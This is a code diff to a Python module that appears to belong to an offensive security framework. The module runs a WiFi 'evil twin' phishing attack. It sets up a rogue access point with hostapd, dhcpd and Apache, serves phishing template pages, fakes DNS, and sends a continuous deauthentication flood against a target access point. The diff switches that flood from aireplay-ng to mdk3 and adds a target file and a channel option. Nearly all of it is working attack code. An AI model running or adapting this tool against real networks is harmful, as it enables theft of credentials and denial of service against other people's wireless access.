@@ -18,7 +18,7 @@ def init():
 	init.Description        ="Wifi Phising (evil twin)"
 	init.CodeName           ="wifi/ev.twin"
 	init.DateCreation       ="31/05/2016"      
-	init.LastModification   ="10/06/2016"
+	init.LastModification   ="09/07/2016"
 	init.References         =None
 	init.License            =KTF_LINCENSE
 	init.var                ={}
@@ -26,16 +26,17 @@ def init():
 	# DEFAULT OPTIONS MODULE
 	init.options = {
 		# NAME    VALUE                        RQ     DESCRIPTION
-		'drive'   :[INTERFACE_MONITOR         ,True ,'Monitor Interface'],
+		'drive'   :[INTERFACE_DEVICE          ,True ,'Interface'],
+		'driveMon':[INTERFACE_MONITOR         ,True ,'Monitor Interface'],
 		'essid'   :["movil_wifi"              ,True ,'AP Essid'],
 		'bssid'   :[MAC_TARGET                ,True ,'AP Mac Address'],
-		'template':["files/wifi/tmp/neutral/" ,True ,'files Server']
+		'template':["files/wifi/tmp/neutral/" ,True ,'Files Phising'],
+		'channel' :["11"                      ,True ,'Channel AP']
 	}
 	# EXTRA OPTIONS MODULE
 	init.extra = {
 		# NAME    VALUE                        RQ     DESCRIPTION
 		'ip_range':["192.168.1.1"             ,False,'Ip Range'],
-		'channel' :["11"                      ,False,'Channel AP']
 	}
 	# AUX INFORMATION MODULE
 	init.aux = """
@@ -49,7 +50,7 @@ def init():
 
 # CODE MODULE    ############################################################################################
 def main(run):
-	if checkDevice(init.var['drive']) and CheckAPmode():
+	if CheckAPmode():
 		Loadingfile(init.var['template'])
 		process=commands.getoutput("airmon-ng check $INTERFACE | tail -n +8 | grep -v \"on interface\" | awk '{ print $2 }'")
 		printAlert(0,"Killing proccess on interface")
@@ -88,6 +89,7 @@ def main(run):
 		commands.getoutput("echo option domain-name-servers "+rango+"\;>> tmp/dhcpd.config")
 		commands.getoutput("echo range "+rangov+".100 "+rangov+".250\;>> tmp/dhcpd.config")
 		commands.getoutput("echo }>> tmp/dhcpd.config")
+		commands.getoutput("echo "+init.var['bssid']+" > tmp/target.log")
 
 		printAlert(0,"Starting Apache Server                   "+status_cmd("service apache2 start"))
 		printAlert(0,"Coping Files to Server                   "+status_cmd("cp -r "+init.var['template']+"* "+PATCH_WWW))
@@ -98,12 +100,12 @@ def main(run):
 		Subprocess("dhcpd -d -f -cf tmp/dhcpd.config")
 		time.sleep(3)
 		printAlert(0,"Starting DOS attack to "+init.var['bssid'])
-		Subprocess("aireplay-ng -0 0 -a "+init.var['bssid']+" "+init.var['drive'])
+		Subprocess("mdk3 "+init.var['driveMon']+" d -b tmp/target.log -c "+init.var['channel'])
 		print(printAlert(8,"(PRESS Ctrol+C) to stop Attack"))
 		DNSFAKE()
 		commands.getoutput("killall dhcpd")
 		commands.getoutput("killall hostapd")
-		commands.getoutput("killall aireplay-ng")
+		commands.getoutput("killall mdk3")
 		commands.getoutput("service NetworkManager start")
 		commands.getoutput("iptables --flush")
 		commands.getoutput("iptables --table nat --flush")
@@ -112,7 +114,7 @@ def main(run):
 		for p in process:
 			commands.getoutput("service "+p+" start")
 
-		printAlert(0,"Removing files                           "+status_cmd("rm -r "+PATCH_WWW+"* ; rm tmp/hostapd.conf; rm tmp/dhcpd.config"))
+		printAlert(0,"Removing files                           "+status_cmd("rm -r "+PATCH_WWW+"* ; rm tmp/hostapd.conf; rm tmp/dhcpd.config; rm tmp/target.log"))
 		printAlert(0,"Stoping Apache Server                    "+status_cmd("service apache2 stop"))
 		Space()
 
